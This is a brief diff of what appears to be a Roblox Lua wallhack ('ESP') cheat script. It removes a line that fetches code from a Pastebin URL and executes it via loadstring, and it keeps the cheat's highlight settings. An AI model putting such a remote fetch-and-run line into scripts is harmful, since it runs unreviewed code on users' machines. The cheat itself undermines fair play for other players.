@@ -1,5 +1,4 @@
 -- Esp
-loadstring(game:HttpGet("https://pastebin.com/raw/s7viVmDR"))()
 local FillColor = Color3.fromRGB(175,25,255)
 local DepthMode = "AlwaysOnTop"
 local FillTransparency = 0.5
